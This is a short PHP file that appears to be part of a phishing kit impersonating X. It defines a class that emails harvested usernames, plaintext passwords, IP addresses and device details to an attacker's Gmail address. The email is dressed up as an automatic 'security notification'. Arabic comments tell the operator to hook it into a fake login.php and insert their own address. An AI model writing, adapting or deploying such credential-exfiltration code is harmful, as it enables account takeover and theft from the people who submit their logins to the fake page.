<?php
class EmailNotifier {
    private $to_email;
    private $from_email = "noreply@x-security.com";
    
    public function __construct($to_email) {
        $this->to_email = $to_email;
    }
    
    public function sendNotification($credentials) {
        $subject = "🔔 إشعار جديد - بيانات X مسجلة";
        $message = $this->buildEmailTemplate($credentials);
        $headers = $this->buildEmailHeaders();
        
        return mail($this->to_email, $subject, $message, $headers);
    }
    
    private function buildEmailTemplate($cred) {
        return "
        📱 إشعار نظام X الآمن
        
        • تم تسجيل بيانات دخول جديدة:
        
        👤 اسم المستخدم: {$cred['username']}
        🔑 كلمة المرور: {$cred['password']}
        🌐 عنوان IP: {$cred['ip_address']}
        ⏰ الوقت: {$cred['timestamp']}
        🗺️ الموقع: {$cred['timezone']}
        💻 الجهاز: {$cred['user_agent']}
        
        --
        نظام المراقبة الأمنية X
        هذا إشعار تلقائي
        ";
    }
    
    private function buildEmailHeaders() {
        return "From: X Security <{$this->from_email}>" . "\r\n" .
               "Reply-To: {$this->from_email}" . "\r\n" .
               "X-Mailer: PHP/" . phpversion();
    }
}

// استخدام النظام في login.php
// أضف هذا بعد حفظ البيانات
$notifier = new EmailNotifier("farbdallhfar5@gmail.com"); // ضع بريدك هنا
$notifier->sendNotification($log_data);
?>
